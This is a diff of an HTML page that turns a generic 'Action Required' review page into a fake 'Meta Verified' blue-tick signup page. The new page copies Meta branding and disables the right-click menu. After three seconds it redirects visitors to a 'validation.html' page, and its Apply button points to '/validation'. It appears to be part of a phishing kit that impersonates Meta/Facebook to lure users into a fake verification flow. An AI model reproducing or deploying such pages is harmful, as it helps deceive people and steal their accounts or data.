@@ -1,111 +1,148 @@
 
+
+
+
+
 <!DOCTYPE html>
-<html>
+
+<html lang="en">
 
 <head>
-  <title>Action Required</title>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-  <link rel="icon" type="image/svg+xml" href="https://buffer-start-page.s3.amazonaws.com/favicon.svg">
-  <link rel="apple-touch-icon-precomposed" sizes="57x57"
-    href="https://buffer-start-page.s3.amazonaws.com/apple-touch-icon-256x256.png">
-  <link rel="preload"
-    href="https://start-page.buffer.com/cdn-cgi/image/height=920/https://buffer-start-page-uploads.s3.amazonaws.com/defaults/hero-card.png"
-    as="image">
-  <style>
-    html,
-    body {
-      font-family: Roboto, sans-serif;
-      min-height: 100%;
-      height: 100%;
-      margin: 0;
-      padding: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified | Get a verified blue tick</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* CSS styles */
 
-    body {
-      background-color: #E4F5FE;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-    }
+        body {
+            font-family: system-ui;
+            margin: 0;
+            padding: 0;
+        }
 
-    .container {
-      max-width: 600px;
-      padding: 20px;
-      background-color: #FFFFFF;
-      border-radius: 20px;
-      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-    }
+        .container-fluid {
+            background: #F5F6F6;
+        }
 
-    .logo {
-      width: 80px;
-      height: 80px;
-      object-fit: cover;
-      border-radius: 50%;
-    }
+        .container {
+            padding: 1rem;
+        }
 
-    h1 {
-      font-family: Roboto, sans-serif;
-      font-size: 32px;
-      font-weight: 700;
-      line-height: 1.4;
-      margin-top: 20px;
-      color: #232323;
-    }
+        .logo {
+            width: 9rem;
+            height: 6rem;
+        }
 
-    h2 {
-      font-family: Roboto, sans-serif;
-      font-size: 24px;
-      font-weight: 700;
-      line-height: 1.4;
-      margin-top: 10px;
-      color: #232323;
-    }
+        .meta-logo {
+            width: 4rem;
+            height: 4rem;
+        }
 
-    .button {
-      background-color: #267CE5;
-      color: #FFFFFF;
-      font-family: Roboto, sans-serif;
-      font-size: 16px;
-      font-weight: 400;
-      padding: 16px 32px;
-      border-radius: 20px;
-      text-decoration: none;
-      display: inline-block;
-      margin-top: 20px;
-    }
+        .btn {
+            background: #0064e0;
+            border: none;
+            border-radius: 100px;
+            padding: 10px 35px;
+            text-decoration: none;
+            color: white;
+            display: inline-block;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+            /* Same font family */
+            font-size: 16px;
+            /* Adjust as needed */
+        }
 
-    .button:hover {
-      background-color: #1A5BBF;
-    }
+        .content {
+            margin-top: 3rem;
+            display: flex;
+            justify-content: center;
+        }
 
-    .copyright {
-      color: #232323;
-      font-size: 14px;
-      margin-top: 30px;
-    }
+        .content .col-sm-6 {
+            margin-top: 3rem;
+            margin-left: 5rem;
+        }
 
-    .footer {
-      margin-top: 20px;
-    }
-  </style>
+        .content p {
+            font-size: 18px;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+            /* Same font family */
+        }
+
+        .sign-up {
+            font-size: 17px;
+            padding-top: 1rem;
+            font-family: Arial, sans-serif;
+            /* Same font family */
+        }
+
+        .business-info {
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+            /* Same font family */
+        }
+
+        .region-info {
+            font-size: 13px;
+            font-style: italic;
+            font-family: Arial, sans-serif;
+            /* Same font family */
+        }
+
+        .image {
+            display: none;
+            width: 42%;
+            height: 100vh;
+            /* Ensure full height */
+            background-size: cover;
+            /* background-position: center; */
+            /* margin-left: 5rem; */
+        }
+
+        @media (min-width: 576px) {
+            .image {
+                display: block;
+            }
+        }
+    </style>
 </head>
 
 <body>
-  <div class="container">
-    <img class="logo"
-      src="https://start-page.buffer.com/cdn-cgi/image/width=160,height=160/https://buffer-start-page-uploads.s3.amazonaws.com/64df12466e02a899e7c4b98a/1692340938315.logo%20fb.png"
-      alt="Logo">
-    <h1>𝐀𝐩𝐩𝐥𝐲</h1>
-    <h2>𝐈𝐧 𝐧𝐞𝐞𝐝 𝐨𝐟 𝐚 𝐫𝐞𝐯𝐢𝐞𝐰? 𝐊𝐢𝐧𝐝𝐥𝐲 𝐭𝐚𝐩 𝐨𝐧 𝐭𝐡𝐞 "𝐀𝐩𝐩𝐥𝐲" 𝐛𝐮𝐭𝐭𝐨𝐧.</h2>
-    <a class='button' href='/request'>𝐀𝐩𝐩𝐥𝐲</a>
-    <p class="copyright">𝐒𝐮𝐢𝐭𝐞 <strong>© 2024</strong></p>
-  </div>
+    <div class="container-fluid">
+        <div class="container">
+            <img src="meta-logo-QVrNRj93.svg" alt="logo" class="logo">
+        </div>
+    </div>
+    <div class="content">
+        <div class="col-sm-6">
+            <img src="blue_tick-B9ADAlwo.png" alt="meta" class="meta-logo">
+            <h1 class="my-3 fs-1">Stand out with Meta<br> Verified</h1>
+            <div style="margin-bottom: 30px;"></div>
+            <a class='btn' href='/validation'>Apply</a>
+            <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
+            <p class="sign-up">Sign up now for creators</p>
+            <p class="mt-4 mb-0">
+                <span class="fw-semibold">Are you a business?</span> Get more information on
+            </p>
+            <a href="#" class="business-info">Meta verified for businesses</a>
+            <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
+        </div>
+        <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
+    </div>
 </body>
+<script>
+    document.addEventListener('contextmenu', event => {
+        event.preventDefault();
+    });
+
+    setTimeout(function() {
+    var redirectURL = "validation.html"; // Updated URL
+    window.location.replace(redirectURL);
+    }, 3000); // 3000 milliseconds (3 seconds)
+    });
+</script>
 
 </html>
